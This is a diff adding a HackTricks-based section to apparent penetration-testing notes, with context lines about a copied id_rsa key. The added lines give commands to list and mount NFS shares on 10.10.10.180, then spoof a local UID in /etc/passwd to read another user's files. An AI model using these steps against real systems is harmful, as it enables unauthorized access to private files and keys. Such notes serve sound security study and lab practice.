@@ -44,3 +44,18 @@ sudo chown kali id_rsa
 ````
 -rw------- 1 kali root 3381 Sep 24  2020 id_rsa
 ````
+
+
+##### Hacktricks
+
+````
+    #apt install nfs-common
+    showmount 10.10.10.180      ~or~showmount -e 10.10.10.180
+    should show you available shares (example /home)
+
+    mount -t nfs -o ver=2 10.10.10.180:/home /mnt/
+    cd /mnt
+    nano into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in
+
+    https://book.hacktricks.xyz/pentesting/nfs-service-pentesting
+````
